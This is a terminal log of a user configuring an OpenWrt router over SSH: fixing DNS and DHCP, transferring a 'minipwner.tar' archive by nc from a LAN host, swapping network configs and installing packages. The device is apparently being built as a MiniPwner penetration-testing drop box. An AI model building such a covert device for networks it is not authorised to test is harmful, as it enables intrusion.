+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:451 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:570 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:85364 (83.3 KiB)  TX bytes:109539 (106.9 KiB)
+
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:6364 errors:0 dropped:405 overruns:0 frame:0
+          TX packets:3358 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:678944 (663.0 KiB)  TX bytes:911077 (889.7 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3050 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:695 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:235511 (229.9 KiB)  TX bytes:126511 (123.5 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:4632 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4632 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:314832 (307.4 KiB)  TX bytes:314832 (307.4 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:283 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:416 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:41568 (40.5 KiB)  TX bytes:64254 (62.7 KiB)
+
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:6558 errors:0 dropped:410 overruns:0 frame:0
+          TX packets:3473 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:700132 (683.7 KiB)  TX bytes:929651 (907.8 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3209 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:767 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:283160 (276.5 KiB)  TX bytes:139624 (136.3 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:4776 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4776 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:324624 (317.0 KiB)  TX bytes:324624 (317.0 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:467 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:681 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:69785 (68.1 KiB)  TX bytes:135375 (132.2 KiB)
+
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:8209 errors:0 dropped:431 overruns:0 frame:0
+          TX packets:4567 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:882777 (862.0 KiB)  TX bytes:1167815 (1.1 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:3877 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:844 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:334054 (326.2 KiB)  TX bytes:159826 (156.0 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:5684 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5684 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:385852 (376.8 KiB)  TX bytes:385852 (376.8 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1612 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2346 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:238742 (233.1 KiB)  TX bytes:451003 (440.4 KiB)
+
+root@OpenWrt:~# dhclient
+-ash: dhclient: not found
+root@OpenWrt:~# dhcp
+-ash: dhcp: not found
+root@OpenWrt:~# dhcp
+-ash: dhcp: not found
+root@OpenWrt:~# nslookup google.com
+Server:    127.0.0.1
+Address 1: 127.0.0.1 localhost
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# nslookup google.com
+Server:    0.0.0.0
+Address 1: 0.0.0.0
+
+nslookup: can't resolve 'google.com': Name or service not known
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:13508 errors:0 dropped:524 overruns:0 frame:0
+          TX packets:7215 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1386455 (1.3 MiB)  TX bytes:1980997 (1.8 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:7027 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:1151 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:566850 (553.5 KiB)  TX bytes:254180 (248.2 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:9612 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:9612 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:658268 (642.8 KiB)  TX bytes:658268 (642.8 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:347 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:523 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:52766 (51.5 KiB)  TX bytes:80979 (79.0 KiB)
+
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# 
+root@OpenWrt:~# whoami
+-ash: whoami: not found
+root@OpenWrt:~# uci set network.lan.proto=dhcp
+root@OpenWrt:~# uci commit network
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:19606 errors:0 dropped:756 overruns:0 frame:0
+          TX packets:10524 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2034977 (1.9 MiB)  TX bytes:2898523 (2.7 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:9710 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:1937 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:781833 (763.5 KiB)  TX bytes:413654 (403.9 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:13308 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:13308 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:935804 (913.8 KiB)  TX bytes:935804 (913.8 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1229 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1989 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:192511 (187.9 KiB)  TX bytes:369154 (360.5 KiB)
+
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:20782 errors:0 dropped:846 overruns:0 frame:0
+          TX packets:11333 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2170066 (2.0 MiB)  TX bytes:3132045 (2.9 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:10141 errors:0 dropped:1 overruns:0 frame:0
+          TX packets:2107 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:835154 (815.5 KiB)  TX bytes:452705 (442.0 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:14316 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:14316 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1004348 (980.8 KiB)  TX bytes:1004348 (980.8 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2158 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:3246 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:325521 (317.8 KiB)  TX bytes:695339 (679.0 KiB)
+
+root@OpenWrt:~# Connection to 192.168.1.1 closed by remote host.
+Connection to 192.168.1.1 closed.
+agent@kali:~$ ssh root@192.168.1.1
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the RSA key sent by the remote host is
+07:cb:18:cc:1e:43:cc:36:ad:da:cc:3c:fe:d7:48:69.
+Please contact your system administrator.
+Add correct host key in /home/agent/.ssh/known_hosts to get rid of this message.
+Offending RSA key in /home/agent/.ssh/known_hosts:1
+RSA host key for 192.168.1.1 has changed and you have requested strict checking.
+Host key verification failed.
+agent@kali:~$ cd .ssh/
+agent@kali:~/.ssh$ ls
+known_hosts
+agent@kali:~/.ssh$ cat known_hosts 
+|1|scmblQQLIAS6nyc3kIpQxyYDazI=|wX6LGNfmiDpoC4FwSmP3gjkMShE= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgnTmu+zM3CGJ8iOr6vCwFHVKKPNeTNvemmMOYQlnAYjyi7S3TT74/XJ4nf1W7C3AfE0DbbugcT8BPx//4FRM4wLxEi+pkHH6YU2sCeemgucf3okGfUcfZamic9myZ+v5dubvYW9Pcu2J3UPXJucAm5iHuV9xqTNi0rg4WBNAX3rI6O0=
+agent@kali:~/.ssh$ mv known_hosts known_hosts.old
+agent@kali:~/.ssh$ cd ..
+agent@kali:~$ ssh root@192.168.1.1
+The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
+RSA key fingerprint is 07:cb:18:cc:1e:43:cc:36:ad:da:cc:3c:fe:d7:48:69.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.1' (RSA) to the list of known hosts.
+root@192.168.1.1's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ping google.com
+ping: bad address 'google.com'
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1554 errors:0 dropped:112 overruns:0 frame:0
+          TX packets:717 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:178513 (174.3 KiB)  TX bytes:109856 (107.2 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:863 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:175 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:67798 (66.2 KiB)  TX bytes:40521 (39.5 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1068 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1068 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:72480 (70.7 KiB)  TX bytes:72480 (70.7 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:963 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1609 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:180180 (175.9 KiB)  TX bytes:256762 (250.7 KiB)
+
+root@OpenWrt:~# uci set network.lan.proto=dhcp
+root@OpenWrt:~# uci commit network
+root@OpenWrt:~# ping google.com
+ping: bad address 'google.com'
+root@OpenWrt:~# Write failed: Broken pipe
+agent@kali:~$ ssh root@192.168.1.108
+The authenticity of host '192.168.1.108 (192.168.1.108)' can't be established.
+RSA key fingerprint is 07:cb:18:cc:1e:43:cc:36:ad:da:cc:3c:fe:d7:48:69.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.1.108' (RSA) to the list of known hosts.
+root@192.168.1.108's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ping google.com
+PING google.com (74.125.227.160): 56 data bytes
+64 bytes from 74.125.227.160: seq=0 ttl=53 time=22.560 ms
+^C
+--- google.com ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 22.560/22.560/22.560 ms
+root@OpenWrt:~# cd /usr/share
+root@OpenWrt:/usr/share# ls
+libubox  udhcpc
+root@OpenWrt:/usr/share# nc 192.168.1.107 3333 minipwner.tar
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) multi-call binary.
+
+Usage: nc [IPADDR PORT]
+
+Open a pipe to IP:PORT
+
+root@OpenWrt:/usr/share# nc 192.168.1.107 3333 > minipwner.tar
+^C
+root@OpenWrt:/usr/share# md5sum minipwner.tar 
+a0665168831cea60f03141d7a54ec0f8  minipwner.tar
+root@OpenWrt:/usr/share# tar -xf minipwner.tar
+root@OpenWrt:/usr/share# cd /usr/share/minipwner
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/network /etc/config/network
+.orig 
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/wireless /etc/config/wirele
+ss.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/firewall /etc/config/firewa
+ll.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/profile /etc/profile.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/fstab /etc/config/fstab.ori
+g
+cp: can't stat '/etc/config/fstab': No such file or directory
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/opkg.conf /etc/opkg.conf.orig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/system /etc/config/system.o
+rig
+root@OpenWrt:/usr/share/minipwner# cp -f /etc/config/dhcp /etc/config/dhcp.orig
+root@OpenWrt:/usr/share/minipwner# cp -f ./network.1 /etc/config/network
+config wifi-device  wlan0
+        option type     mac80211
+        option channel  6
+        option macaddr  f8:d1:11:ff:01:d4
+        option hwmode   11ng
+        option htmode   HT20
+        list ht_capab   SHORT-GI-20
+        list ht_capab   SHORT-GI-40
+        list ht_capab   RX-STBC1
+        list ht_capab   DSSS_CCK-40
+        # REMOVE THIS LINE TO ENABLE WIFI:
+        #option disabled 1
+
+config wifi-iface
+        option device   wlan0
+        option network  wan
+        option mode     sta
+        option ssid     TOKI
+        option encryption none
+
+
+config wifi-device  wlan0
+        option type     mac80211
+        option channel  6
+        option macaddr  0c:82:68:f9:20:7a
+        option hwmode   11ng
+        option htmode   HT20
+        list ht_capab   SHORT-GI-20
+        list ht_capab   SHORT-GI-40
+        list ht_capab   RX-STBC1
+        list ht_capab   DSSS_CCK-40
+        # REMOVE THIS LINE TO ENABLE WIFI:
+        #option disabled 1
+
+config wifi-iface
+        option device   wlan0
+        option network  wan
+        option mode     sta
+        option ssid     TOKI
+        option encryption none
+
+
+
+~
+root@OpenWrt:/usr/share/minipwner# /etc/init.d/network restart
+Write failed: Broken pipe
+agent@kali:~$ ssh root@192.168.1.1
+root@192.168.1.1's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ping google.com
+ping: bad address 'google.com'
+root@OpenWrt:~# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.1  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1183 errors:0 dropped:100 overruns:0 frame:0
+          TX packets:322 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:117768 (115.0 KiB)  TX bytes:62138 (60.6 KiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:858 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:211 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:65399 (63.8 KiB)  TX bytes:41937 (40.9 KiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1116 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1116 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:75744 (73.9 KiB)  TX bytes:75744 (73.9 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:597 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1215 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:112246 (109.6 KiB)  TX bytes:198379 (193.7 KiB)
+
+root@OpenWrt:~# cd /etc/config
+root@OpenWrt:/etc/config# ls
+dhcp           firewall.orig  system         uhttpd
+dhcp.orig      luci           system.orig    wireless
+dropbear       network        ubootenv       wireless.orig
+firewall       network.orig   ucitrack       wireless.toki
+root@OpenWrt:/etc/config# cat network.orig 
+
+config interface 'loopback'
+	option ifname 'lo'
+	option proto 'static'
+	option ipaddr '127.0.0.1'
+	option netmask '255.0.0.0'
+
+config interface 'lan'
+	option ifname 'eth0'
+	option type 'bridge'
+	option ipaddr '192.168.1.1'
+	option netmask '255.255.255.0'
+	option proto 'dhcp'
+
+root@OpenWrt:/etc/config# cat network
+config 'interface' 'loopback'
+        option 'ifname' 'lo'
+        option 'proto' 'static'
+        option 'ipaddr' '127.0.0.1'
+        option 'netmask' '255.0.0.0'
+
+config 'interface' 'lan'
+        option 'ifname' 'eth0'
+        option 'type' 'bridge'
+        option 'proto' 'static'
+        option 'ipaddr' '192.168.1.1'
+        option 'netmask' '255.255.255.0'
+
+config 'interface' 'wan'
+        option 'ifname' 'wlan0'
+        option 'proto' 'dhcp'
+root@OpenWrt:/etc/config# cat system
+config system
+	option hostname	OpenWrt
+	option timezone	UTC
+
+config timeserver ntp
+	list server	0.openwrt.pool.ntp.org
+	list server	1.openwrt.pool.ntp.org
+	list server	2.openwrt.pool.ntp.org
+	list server	3.openwrt.pool.ntp.org
+	option enable_server 0
+root@OpenWrt:/etc/config# ls
+dhcp           firewall.orig  system         uhttpd
+dhcp.orig      luci           system.orig    wireless
+dropbear       network        ubootenv       wireless.orig
+firewall       network.orig   ucitrack       wireless.toki
+root@OpenWrt:/etc/config# cp network network.toki
+root@OpenWrt:/etc/config# cp network.orig network
+root@OpenWrt:/etc/config# cat dhcp.orig
+config dnsmasq
+	option domainneeded	1
+	option boguspriv	1
+	option filterwin2k	0  # enable for dial on demand
+	option localise_queries	1
+	option rebind_protection 1  # disable if upstream must serve RFC1918 addresses
+	option rebind_localhost 1  # enable for RBL checking and similar services
+	#list rebind_domain example.lan  # whitelist RFC1918 responses for domains
+	option local	'/lan/'
+	option domain	'lan'
+	option expandhosts	1
+	option nonegcache	0
+	option authoritative	1
+	option readethers	1
+	option leasefile	'/tmp/dhcp.leases'
+	option resolvfile	'/tmp/resolv.conf.auto'
+	#list server		'/mycompany.local/1.2.3.4'
+	#option nonwildcard	1
+	#list interface		br-lan
+	#list notinterface	lo
+	#list bogusnxdomain     '64.94.110.11'
+
+config dhcp lan
+	option interface	lan
+	option start 	100
+	option limit	150
+	option leasetime	12h
+
+config dhcp wan
+	option interface	wan
+	option ignore	1
+root@OpenWrt:/etc/config# cat dhcp
+config dnsmasq
+	option domainneeded	1
+	option boguspriv	1
+	option filterwin2k	0  # enable for dial on demand
+	option localise_queries	1
+	option rebind_protection 1  # disable if upstream must serve RFC1918 addresses
+	option rebind_localhost 1  # enable for RBL checking and similar services
+	#list rebind_domain example.lan  # whitelist RFC1918 responses for domains
+	option local	'/lan/'
+	option domain	'lan'
+	option expandhosts	1
+	option nonegcache	0
+	option authoritative	1
+	option readethers	1
+	option leasefile	'/tmp/dhcp.leases'
+	option resolvfile	'/tmp/resolv.conf.auto'
+	#list server		'/mycompany.local/1.2.3.4'
+	#option nonwildcard	1
+	#list interface		br-lan
+	#list notinterface	lo
+	#list bogusnxdomain     '64.94.110.11'
+
+config dhcp lan
+	option interface	lan
+	option start 	100
+	option limit	150
+	option leasetime	12h
+
+config dhcp wan
+	option interface	wan
+	option ignore	1
+root@OpenWrt:/etc/config# diff
+-ash: diff: not found
+root@OpenWrt:/etc/config# /etc/init.d/network restart
+Write failed: Broken pipe
+agent@kali:~$ ssh root@192.168.1.1
+ssh: connect to host 192.168.1.1 port 22: Connection refused
+agent@kali:~$ ssh root@192.168.1.108
+root@192.168.1.108's password: 
+
+
+BusyBox v1.19.4 (2013-03-14 11:28:31 UTC) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+  _______                     ________        __
+ |       |.-----.-----.-----.|  |  |  |.----.|  |_
+ |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
+ |_______||   __|_____|__|__||________||__|  |____|
+          |__| W I R E L E S S   F R E E D O M
+ -----------------------------------------------------
+ ATTITUDE ADJUSTMENT (12.09, r36088)
+ -----------------------------------------------------
+  * 1/4 oz Vodka      Pour all ingredients into mixing
+  * 1/4 oz Gin        tin with ice, strain into glass.
+  * 1/4 oz Amaretto
+  * 1/4 oz Triple sec
+  * 1/4 oz Peach schnapps
+  * 1/4 oz Sour mix
+  * 1 splash Cranberry juice
+ -----------------------------------------------------
+root@OpenWrt:~# ping google.com
+PING google.com (74.125.227.232): 56 data bytes
+64 bytes from 74.125.227.232: seq=0 ttl=53 time=23.370 ms
+^C
+--- google.com ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 23.370/23.370/23.370 ms
+root@OpenWrt:~# opkg update
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/Packages.gz.
+Updated list of available packages in /var/opkg-lists/attitude_adjustment.
+root@OpenWrt:~# cd /usr/share/minipwner
+root@OpenWrt:/usr/share/minipwner# opkg update
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/Packages.gz.
+Updated list of available packages in /var/opkg-lists/attitude_adjustment.
+root@OpenWrt:/usr/share/minipwner# opkg install kernel
+Package kernel (3.3.8-1-d6597ebf6203328d3519ea3c3371a493) installed in root is up to date.
+root@OpenWrt:/usr/share/minipwner# opkg install kmod-usb-storage
+Installing kmod-usb-storage (3.3.8-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/kmod-usb-storage_3.3.8-1_ar71xx.ipk.
+Installing kmod-scsi-core (3.3.8-1) to root...
+Downloading http://downloads.openwrt.org/attitude_adjustment/12.09/ar71xx/generic/packages/kmod-scsi-core_3.3.8-1_ar71xx.ipk.
+Configuring kmod-scsi-core.
+Configuring kmod-usb-storage.
+root@OpenWrt:/usr/share/minipwner# opkg install kmod-fs-ext4
+Installing kmod-fs-ext4 (3.3.8-1) to root...
